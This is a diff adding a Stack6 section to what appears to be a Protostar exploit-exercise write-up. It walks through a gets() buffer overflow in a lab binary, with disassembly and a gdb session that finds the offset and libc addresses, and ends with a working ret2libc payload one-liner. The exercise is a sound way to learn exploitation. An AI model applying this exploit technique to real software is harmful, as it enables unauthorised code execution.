@@ -553,6 +553,156 @@ $ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
 (cat stack5sploit; cat) | ./stack5
 ```
 
+##Stack6
+---------------------------------------
+###Source Code:
+```C
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void getpath()
+{
+  char buffer[64];
+  unsigned int ret;
+
+  printf("input path please: "); fflush(stdout);
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);  
+
+  if((ret & 0xbf000000) == 0xbf000000) {
+      printf("bzzzt (%p)\n", ret);
+      _exit(1);
+  }
+
+  printf("got path %s\n", buffer);
+}
+
+int main(int argc, char **argv)
+{
+  getpath();
+}
+```
+###Stack:
+| eip | ebp | int ret |char buffer[64]  |
+
+###Plan:
+So this program basically uses gets to grab an input for buffer, then uses builtin_return_address(0) to get the return address of the current function and prevents it from returning to any address in the 0xbf------ range.(likely where our buffer is to prevent shellcode execution). So in this one, we will go a different route, such as Return to libc or ROP chaining.
+
+First we need to find our offset 
+
+```bash
+l:~/workspace/proto (master) $ ulimit -s unlimited
+l:~/workspace/proto (master) $ gdb ./stack6      
+gdb$ disas getpath
+Dump of assembler code for function getpath:
+```
+```asm
+   0x08048484 <+0>:     push   ebp
+   0x08048485 <+1>:     mov    ebp,esp
+   0x08048487 <+3>:     sub    esp,0x68
+=> 0x0804848a <+6>:     mov    eax,0x80485d0
+   0x0804848f <+11>:    mov    DWORD PTR [esp],eax
+   0x08048492 <+14>:    call   0x80483c0 <printf@plt>
+   0x08048497 <+19>:    mov    eax,ds:0x8049720
+   0x0804849c <+24>:    mov    DWORD PTR [esp],eax
+   0x0804849f <+27>:    call   0x80483b0 <fflush@plt>
+   0x080484a4 <+32>:    lea    eax,[ebp-0x4c]
+   0x080484a7 <+35>:    mov    DWORD PTR [esp],eax
+   0x080484aa <+38>:    call   0x8048380 <gets@plt>
+   0x080484af <+43>:    mov    eax,DWORD PTR [ebp+0x4]
+   0x080484b2 <+46>:    mov    DWORD PTR [ebp-0xc],eax
+   0x080484b5 <+49>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x080484b8 <+52>:    and    eax,0xbf000000
+   0x080484bd <+57>:    cmp    eax,0xbf000000
+   0x080484c2 <+62>:    jne    0x80484e4 <getpath+96>
+   0x080484c4 <+64>:    mov    eax,0x80485e4
+   0x080484c9 <+69>:    mov    edx,DWORD PTR [ebp-0xc]
+   0x080484cc <+72>:    mov    DWORD PTR [esp+0x4],edx
+   0x080484d0 <+76>:    mov    DWORD PTR [esp],eax
+   0x080484d3 <+79>:    call   0x80483c0 <printf@plt>
+   0x080484d8 <+84>:    mov    DWORD PTR [esp],0x1
+   0x080484df <+91>:    call   0x80483a0 <_exit@plt>
+   0x080484e4 <+96>:    mov    eax,0x80485f0
+   0x080484e9 <+101>:   lea    edx,[ebp-0x4c]
+   0x080484ec <+104>:   mov    DWORD PTR [esp+0x4],edx
+   0x080484f0 <+108>:   mov    DWORD PTR [esp],eax
+   0x080484f3 <+111>:   call   0x80483c0 <printf@plt>
+   0x080484f8 <+116>:   leave  
+   0x080484f9 <+117>:   ret  
+```
+```bash
+End of assembler dump.
+gdb$ b *0x080484f9 
+Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.
+gdb$ run
+Starting program: /home/ubuntu/workspace/proto/stack6 
+input path please: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+--------------------------------------------------------------------------[regs]
+  EAX: 0x00000035  EBX: 0x55736000  ECX: 0x00000000  EDX: 0x55737898  o d I t S z a p c 
+  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xFFFFD128  ESP: 0xFFFFD11C  EIP: 0x080484F9
+  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
+--------------------------------------------------------------------------[code]
+=> 0x80484f9 <getpath+117>:     ret    
+   0x80484fa <main>:    push   ebp
+   0x80484fb <main+1>:  mov    ebp,esp
+   0x80484fd <main+3>:  and    esp,0xfffffff0
+   0x8048500 <main+6>:  call   0x8048484 <getpath>
+   0x8048505 <main+11>: mov    esp,ebp
+   0x8048507 <main+13>: pop    ebp
+   0x8048508 <main+14>: ret    
+--------------------------------------------------------------------------------
+
+Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
+23      stack6/stack6.c: No such file or directory.
+gdb$ p $esp
+$1 = (void *) 0xffffd11c                                                    #<-- return location to overwrite
+gdb$ x/40wx $esp-60
+0xffffd0bc:     0x080482a1      0x55576938      0x00000000      0x000000c2
+0xffffd0cc:     0x61616161      0x61616161      0x61616161      0x61616161  #<-- start of input
+0xffffd0dc:     0x61616161      0x61616161      0x61616161      0x61616161
+0xffffd0ec:     0x61616161      0x61616161      0x00616161      0xffffd128
+0xffffd0fc:     0x08048539      0x08048520      0x080483d0      0x00000000
+0xffffd10c:     0x08048505      0x557363c4      0x55576000      0xffffd128
+0xffffd11c:     0x08048505      0x08048520      0x00000000      0x00000000
+0xffffd12c:     0x555a5a83      0x00000001      0xffffd1c4      0xffffd1cc
+0xffffd13c:     0x55563cea      0x00000001      0xffffd1c4      0xffffd164
+0xffffd14c:     0x08049700      0x08048258      0x55736000      0x00000000
+gdb$ p $1 - 0xffffd0cc                                                      #<-- subtract for the offset
+$2 = (void *) 0x50
+gdb$ 
+
+gdb$ print system                                                   #get location of system function
+$1 = {<text variable, no debug info>} 0x555cc190 <system>
+gdb$ print exit                                                     #get loc of exit function
+$2 = {<text variable, no debug info>} 0x555bf1e0 <exit>
+gdb$ find $1, +99999999999999, "/bin/sh"                            #find "/bin/sh" in memory to use as arg
+0x556eca24
+warning: Unable to access 16000 bytes of target memory at 0x5573ac2c, halting search.
+1 pattern found.
+gdb$ quit
+```
+So now that we have our offset, and the locations in memory we can form the following payload by setting up the stack like follows:
+
+FILLER + SYSTEM function call + Return value for System function call+ ARG FOR SYSTEM function call
+For mine, i wanted it to exit cleanly after the shell, so i made SYSTEM's return value the function call for EXIT.
+```python
+       #fill          #system               #exit                 #bin/sh
+print 'A'*0x50 + '\x90\xc1\x5c\x55'+  '\xe0\xf1\x5b\x55'   +'\x24\xca\x6e\x55'"
+```
+
+
+###winning command:
+```bash
+$ python -c "print 'A'*0x50+'\x90\xc1\x5c\x55'+  '\xe0\xf1\x5b\x55'   +'\x24\xca\x6e\x55'" > stack6sploit
+```
+###Python exploit:
+```Python
+```
 
 
 
